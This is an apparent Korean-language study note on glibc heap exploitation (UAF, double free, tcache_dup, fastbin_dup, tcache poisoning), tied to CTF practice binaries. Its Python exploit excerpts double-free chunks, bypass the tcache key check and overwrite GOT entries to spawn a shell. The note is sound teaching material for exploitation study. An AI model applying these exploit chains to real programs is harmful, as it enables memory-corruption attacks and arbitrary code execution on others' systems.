# UAF → Double Free → tcache_dup 개념 노트

힙 익스플로잇의 뿌리인 **UAF(Use-After-Free)** 부터, 그걸 인위적으로 만들어내는
**double free**, 그리고 그걸 glibc tcache/fastbin에서 써먹는 **tcache_dup / fastbin_dup**
까지의 흐름을 한 번에 정리한 이론 노트. 예제는 같은 저장소의 실제 문제
(`test/tcache_dup`, `test/tcache_dup2`, `test/tcache_poisoning`, `test/uaf_overwrite`)로 연결.

---

## 0. 큰 그림 — 왜 이 순서인가

```
UAF (버그 클래스)              "free된 메모리를 계속 쓴다"
   ├─ 진짜 UAF: 코드에 dangling pointer 버그가 있음  → test/uaf_overwrite
   └─ 인조 UAF: double free 로 억지로 만듦
          │
          └─ double free (수단)   같은 청크를 두 번 free
                 ├─ tcache 에서 → tcache_dup     → test/tcache_dup, test/tcache_dup2
                 └─ fastbin 에서 → fastbin_dup
                        │
                        └─ poisoning (목적)  free 청크의 next/fd 를 덮어
                               임의 주소를 malloc 으로 받아냄 → 임의 쓰기 → 흐름 탈취
```

핵심 한 줄:
> **UAF = "free된 청크를 조작 가능한 상태"가 목표이고, double free는 그 상태를 억지로 만드는 수단, poisoning은 그걸로 임의 쓰기를 얻는 마무리다.**

---

## 1. UAF (Use-After-Free) 이론

### 1.1 정의

메모리를 `free()` 한 뒤에도 **그 포인터(dangling pointer)를 계속 사용**하는 버그.
`free`는 메모리를 OS에 돌려주는 게 아니라 **할당자(allocator)의 재사용 목록(bin)에 반납**할 뿐이라,
포인터가 가리키는 주소 자체는 그대로 살아있다. 그래서:

- **free 후 읽기** → 할당자가 그 자리에 적어둔 메타데이터(`fd`/`bk`/`key` 등)가 노출됨 → **leak**
- **free 후 쓰기** → 그 메타데이터를 조작 → **다음 malloc의 반환 주소 조작**
- **free 후 재할당** → 같은 청크를 다른 타입/의미로 다시 받아 **타입 혼동(type confusion)**

### 1.2 free가 남기는 흔적 (왜 leak이 되나)

청크를 free하면 할당자가 **user data 영역에 메타데이터를 덮어쓴다.** 어느 bin이냐에 따라 다름:

| free된 bin | user data 맨 앞(8B)에 적히는 값 | 활용 |
|---|---|---|
| tcache | `next` (다음 tcache 청크, 없으면 0 또는 보호값) | poisoning |
| tcache (2번째 8B) | `key` (tcache_perthread_struct 주소) | double free 탐지 |
| fastbin | `fd` (다음 fastbin 청크) | poisoning |
| unsorted bin | `fd`=`bk`=`main_arena+96` (**libc 내부 주소**) | **libc leak** |

→ `test/uaf_overwrite`의 1단계가 바로 이 unsorted bin leak(`fd=main_arena+96`을 UAF로 읽음).

### 1.3 타입 혼동 UAF 예 (uaf_overwrite 2단계)

```c
struct Human { char name[16]; int weight; long age;      };  // age  @ offset 24
struct Robot { char name[16]; int weight; void (*fptr)(); };  // fptr @ offset 24
```

둘 다 크기가 같아(malloc 0x20 → 청크 0x30) **같은 tcache bin을 공유**한다.
`human`을 free한 직후 `robot`을 malloc하면 **같은 청크를 재사용** → `human->age`에 심어둔 값이
`robot->fptr`로 해석됨 → 함수 포인터 덮어쓰기 → shell. (상세는 `test/uaf_overwrite/writeup.md`)

---

## 2. Double Free

### 2.1 정의

이미 free한 메모리를 **또 free**하는 행위/버그. "두 번 free한다"는 행위 자체를 가리키는 **일반 용어**다.
어느 할당자·어느 bin이든 쓸 수 있는 상위 개념이고, 구체적으로 어느 bin에서 터뜨리냐에 따라
`tcache_dup` / `fastbin_dup` 등으로 갈린다.

### 2.2 왜 강력한가 — 인조 UAF

같은 청크가 bin에 **두 번** 들어가면, malloc으로 그 청크를 **두 번 받을 수 있다.**

```
free(A)              # bin: A -> NULL
free(A)              # bin: A -> A      (A의 next가 자기 자신 A를 가리킴)

a = malloc()         # A 반환. bin: A -> NULL ... 인데 아직 A가 하나 더 남은 상태
# 이 시점에 a에 값을 쓰면 = "bin에 남아있는 A의 next"를 덮는 것 → poisoning
```

결과적으로 **하나는 살아있는 데이터, 다른 하나는 아직 free 리스트에 물린 청크** = UAF와 동일한 상황을
버그 없이 억지로 만들어낸 것. 그래서 "인조 UAF"라고 부른다.

### 2.3 double free 탐지(mitigation)

- **fastbin**: 옛날부터 **맨 앞 청크 1개만** 검사 — `if (old == p) abort` (fasttop 검사).
- **tcache**: glibc **2.26~2.28 은 검사 전혀 없음** → `free(A); free(A)` 가 그냥 됨.
  glibc **2.29+** 부터 **`key` 필드 검사** 추가(아래 3.3).

---

## 3. tcache_dup — tcache에서의 double free

### 3.1 tcache 복습

- glibc 2.26+ 의 thread-local 캐시. 작은 청크(0x20~0x410)를 bin당 **단일 연결 리스트(LIFO)** 로 관리.
- 연결은 청크의 user data 맨 앞 8B(`next`)로. free 시 먼저 tcache로 가고, bin이 꽉 차면(기본 7개) fastbin/unsorted로.
- malloc 시 **검증이 거의 없음** → `next`를 믿고 그 주소를 반환 → poisoning의 토대.

### 3.2 예제 ①: `test/tcache_dup` (glibc 2.27, key 검사 **없음**)

소스 핵심 — `delete()`에 **free 후 포인터를 NULL로 안 지움** → double free 그대로 가능:

```c
int delete() {
    scanf("%d", &idx);
    if (idx > 10) return -1;
    free(ptr[idx]);          // ptr[idx] = NULL 이 없다! → 재free 가능
}
void get_shell() { system("/bin/sh"); }
```

poc 흐름 (`test/tcache_dup/poc.py`):

```python
create(0x10, b'aaaaaaaa')          # ptr[0] 할당 (청크 크기 0x20 → tcache[0x20])
delete(0)                          # tcache[0x20]: A -> NULL
delete(0)                          # double free → tcache[0x20]: A -> A   (2.27은 검사 없음)

create(0x10, p64(e.got['free']))   # A 받으면서 A.next = &free@got   ← poisoning
create(0x10, b'bbbbbbbb')          # A (원본) 소비. tcache[0x20]: free@got
create(0x10, p64(e.symbols['get_shell']))  # free@got 를 청크로 받아 get_shell 주소 기입
delete(0)                          # free(ptr[0]) 호출 → free@got=get_shell → get_shell() 실행
```

| 단계 | tcache[0x20] 상태 | 한 일 |
|---|---|---|
| create(0) | — | 피해자 청크 A 확보 |
| delete(0) | `A -> NULL` | 1차 free |
| delete(0) | `A -> A` | **double free (인조 UAF)** |
| create(got) | `A -> free@got` | A 받아 **next를 free@got로 덮음 (poisoning)** |
| create(b) | `free@got` | 원본 A 소비 |
| create(get_shell) | `—` | free@got 받아서 **GOT를 get_shell로 덮음 (임의 쓰기)** |
| delete(0) | — | `free()` 호출 = `get_shell()` 실행 → **shell** |

> 여기선 `free@got` 를 타겟으로 잡았다. no-PIE 바이너리라 `get_shell`/GOT 주소가 고정이라 **libc leak조차 필요 없음.**

### 3.3 예제 ②: `test/tcache_dup2` (glibc 2.30, key 검사 **있음** → 우회)

glibc 2.29+ 는 free된 tcache 청크 2번째 8B에 **`key`**(=`tcache_perthread_struct` 주소)를 적어두고,
free할 때 "이 청크 key가 이미 tcache key와 같네? → 이미 free됨" 이라 판단해 **double free로 abort**.

**우회:** 2차 free 전에 **`modify`로 key(offset 8)를 덮어** 검사 무력화.

```python
create(0x10, b'aaaaaaaa')  # ptr[0]
create(0x10, b'bbbbbbbb')  # ptr[1]   ─┐ tcache->counts/entry 셋업용
create(0x10, b'cccccccc')  # ptr[2]   ─┘
delete(2); delete(1); delete(0)        # 정상 free 3개 (tcache[0x20]: 0 -> 1 -> 2)

modify(0, 16, b'A'*16)     # ptr[0]의 16바이트 덮기 → next & KEY 둘 다 오염 → key 검사 무력화
delete(0)                  # 이제 double free 통과! tcache[0x20]: 0 -> (오염된 next)

create(0x10, p64(e.got['exit']))   # poisoning: next = exit@got
create(0x10, b'B'*8)               # 원본 소비
create(0x10, p64(get_shell))       # exit@got = get_shell 로 덮기
# 메뉴에서 잘못된 입력/종료 유도 → exit() 호출 → get_shell()
```

핵심은 `modify_heap()`이 **free된 청크(ptr[0])를 그대로 쓰게 해주는 것**(인덱스만 맞으면 됨) →
free된 청크의 메타데이터를 편집할 수 있는 전형적 UAF-write. (상세 trace는 `test/tcache_dup2/poc.py` 주석)

### 3.4 tcache poisoning 단독 예제: `test/tcache_poisoning` (glibc 2.27)

double free 없이 **단일 UAF(free 후 edit 가능)** 만으로 poisoning하는 가장 순수한 형태.
`__free_hook`을 one_gadget으로 덮는 고전 패턴 + `stdout` 부분 덮어쓰기로 libc leak.
(상세는 `test/tcache_poisoning/poc.py` — 이 노트의 "poisoning" 개념이 그대로 코드로 보임)

---

## 4. fastbin_dup — fastbin에서의 double free

tcache_dup과 논리는 같지만 **제약이 두 개 더** 있다.

### 4.1 제약 1 — 맨앞 검사 → 중간에 다른 청크 끼우기

fastbin은 넣을 때 **top 1개만** double free를 검사(`old == p`). 그래서 바로 `free(A);free(A)`는 abort.
→ 중간에 **같은 크기** 청크 B를 끼워 top을 바꿔 검사 회피:

```
free(A)   # top -> A
free(B)   # top -> B -> A      (넣는 A가 아니라 B가 top이니 통과)
free(A)   # 넣는 A != top(B) → 통과!   top -> A -> B -> A   (A 중복)
```

### 4.2 제약 2 — 할당 시 size 검사 → fake chunk 필요

fastbin은 malloc으로 꺼낼 때 **청크 size가 해당 fastbin 등급과 맞는지** 검사
(`chunksize(victim) != nb → "memory corruption (fast)"`). 그래서 poisoning 타겟을 아무 데나 못 잡고,
**타겟 주소의 size 필드 위치에 올바른 크기값이 들어있는 곳**(보통 `__malloc_hook` 근처 어긋난 정렬 주소)을
골라야 한다.

### 4.3 추가 선행조건 — tcache를 먼저 채워야 fastbin 도달

glibc 2.26+ 에서는 free가 **tcache 우선**이라, fastbin에 넣으려면 같은 크기를 **tcache가 꽉 찰 때까지(7개) 먼저 free**
해야 한다. 실습에서 "fastbin인 줄 알았는데 tcache였다"가 여기서 나옴.

### 4.4 tcache_dup vs fastbin_dup 비교표

| 항목 | tcache_dup | fastbin_dup |
|---|---|---|
| double free 검사 | (2.26~2.28) 없음 / (2.29+) key | 항상 (맨앞 1개) |
| 우회 | key 덮기 | 중간에 B 끼우기 `free(A);free(B);free(A)` |
| 할당 시 size 검사 | 없음 (타겟 자유) | **있음** (fake size 필요) |
| 선행조건 | 바로 사용 | **tcache 7개 먼저 채움** |
| 난이도 | 쉬움 | 중간 |

---

## 5. 되짚기 (자주 헷갈리는 점)

- **double free는 수단, UAF는 상태, poisoning은 목적.** 셋을 섞어 쓰지 말 것.
- tcache는 2.28까지 double free 검사가 **아예 없다.** 2.29+ 부터 `key` 검사 → 우회는 **key 덮기**.
- fastbin은 **항상** 맨앞 검사가 있어서 **중간 끼우기**가 필요하고, **size 검사** 때문에 타겟이 제약됨.
- 요즘 glibc에서 fastbin 보려면 **tcache(7개)부터 채워라.**
- poisoning의 본질은 "**free 청크의 next/fd를 덮어 임의 주소를 malloc으로 받아내는 것**" → 곧 임의 쓰기.
- no-PIE + `get_shell` 존재 문제는 **libc leak 없이** GOT 덮기만으로 끝난다(`test/tcache_dup`).
- glibc 2.32+ 는 **safe-linking**(`next = (chunk>>12) ^ ptr`)이 추가 → poisoning에 **힙 leak** 필요
  (→ `test2/tcache_poisoning_with_safelinking`).

---

## 6. 저장소 내 예제 맵

| 개념 | 예제 폴더 | glibc | 포인트 |
|---|---|---|---|
| 진짜 UAF (leak + 타입혼동) | `test/uaf_overwrite` | 2.27 | unsorted leak + Human/Robot 혼동 |
| tcache poisoning (순수) | `test/tcache_poisoning` | 2.27 | `__free_hook` 덮기, stdout 부분덮기 leak |
| tcache_dup (검사 없음) | `test/tcache_dup` | 2.27 | GOT 덮기, leak 불필요 |
| tcache_dup (key 우회) | `test/tcache_dup2` | 2.30 | key 덮어 double free |
| poisoning + safe-linking | `test2/tcache_poisoning_with_safelinking` | 2.32+ | 힙 leak 필요 |
